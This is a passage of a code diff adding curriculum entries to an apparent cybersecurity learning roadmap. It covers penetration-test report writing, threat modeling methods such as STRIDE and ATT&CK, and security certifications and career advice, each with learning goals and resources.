+          desc: "A perfect technical hack means nothing if the report is unreadable. Reports are the product that clients pay for — they must be clear, accurate, actionable, and risk-contextualized. Executive summary: 1-2 pages for non-technical leadership — overall risk rating, critical findings summary, business impact language (not technical jargon). Technical findings: vulnerability name, CVSS score, affected systems, detailed description, proof-of-concept evidence (screenshots with sensitive data redacted), business impact, remediation recommendation. Methodology section. Scope and limitations. Remediation priorities: critical (immediate), high (within 30 days), medium (within 90 days), low (best effort). Common mistakes: listing vulnerabilities without exploitation evidence, vague remediations, no business context, incorrect severity ratings.",
+          master: [
+            "Write a complete executive summary for a penetration test without using technical jargon",
+            "Assign CVSS scores accurately and explain the scoring vector for each finding",
+            "Write a finding with: description, evidence, business impact, and specific remediation steps",
+            "Correctly prioritize findings based on likelihood and business impact, not CVSS alone",
+            "Review a sample report and identify its weaknesses",
+            "Understand the difference between a vulnerability assessment report and a pentest report",
+            "Present findings to a non-technical executive audience effectively"
+          ],
+          res: [
+            "The Art of Writing Penetration Test Reports (TCM Security guide)",
+            "CVSS v3.1 Specification (first.org/cvss)",
+            "Sample pentest reports (github.com/juliocesarfort/public-pentesting-reports)",
+            "Penetration Testing (Weidman — reporting chapter)"
+          ]
+        },
+        {
+          name: "Threat Modeling",
+          tag: "advanced",
+          desc: "Threat modeling identifies security risks before systems are built or compromised. STRIDE methodology: Spoofing (impersonating identity), Tampering (modifying data), Repudiation (denying actions), Information Disclosure (leaking data), Denial of Service (disrupting availability), Elevation of Privilege (gaining unauthorized access). PASTA (Process for Attack Simulation and Threat Analysis): risk-centric, seven-stage process. MITRE ATT&CK as a threat model framework for enterprise systems. Drawing data flow diagrams (DFDs): identify trust boundaries and evaluate threats at each crossing. Threat modeling tools: OWASP Threat Dragon, Microsoft Threat Modeling Tool. Prioritize threats using DREAD or CVSS. Output: documented threats, mitigations, and residual risks.",
+          master: [
+            "Create a threat model for a web application using STRIDE on a data flow diagram",
+            "Map a real-world breach (e.g., SolarWinds, Equifax) to ATT&CK techniques",
+            "Identify trust boundaries in an architecture diagram and enumerate threats at each",
+            "Score threats using DREAD and create a prioritized remediation roadmap",
+            "Explain how threat modeling changes the security conversation from reactive to proactive",
+            "Build a threat model for an AWS multi-tier application",
+            "Use ATT&CK Navigator to document a threat actor profile's TTPs"
+          ],
+          res: [
+            "Threat Modeling: Designing for Security (Adam Shostack — the definitive guide)",
+            "OWASP Threat Dragon (free threat modeling tool)",
+            "MITRE ATT&CK Navigator (attack.mitre.org/navigator)",
+            "Threat Modeling Manifesto (threatmodelingmanifesto.org)"
+          ]
+        },
+        {
+          name: "Certifications and Career Development",
+          tag: "core",
+          desc: "The offensive security certification landscape: OSCP (Offensive Security Certified Professional) is the gold standard for penetration testers — 24-hour practical exam, requires hacking multiple machines without hints. OSEP (advanced post-exploitation and AD), OSED (exploit development), OSWE (web application expert) for specializations. CRTO (Certified Red Team Operator) focuses on Cobalt Strike and red teaming. PNPT (Practical Network Penetration Testing by TCM Security) is excellent for beginners. CEH is theoretical and not respected by practitioners. Bug bounty as a career path: start with HackerOne, build a track record, specialize in a platform or vulnerability class. Building a public profile: CVEs, blog posts, conference talks, GitHub tools, CTF writeups. Networking: DEF CON, Black Hat, local BSides conferences.",
+          master: [
+            "Complete the OSCP PWK labs and pass the exam (or a comparable practical cert)",
+            "Find and responsibly disclose at least one bug bounty vulnerability",
+            "Write a detailed technical blog post about a vulnerability you discovered or researched",
+            "Build a public GitHub repository with a security tool or automation you created",
+            "Participate in CTF competitions and publish writeups after the competition ends",
+            "Attend at least one security conference (DEF CON, Black Hat, BSides local)",
+            "Build a network with other security professionals — referrals matter more than certs"
+          ],
+          res: [
+            "Offensive Security PEN-200 (OSCP course — the best structured pentesting training)",
+            "TCM Security PNPT course (affordable, excellent beginner path)",
+            "HackerOne Hacker101 (free training for bug bounty)",
+            "DEF CON talks archive (youtube.com/defjcon — free research content)"
           ]
         }
       ]
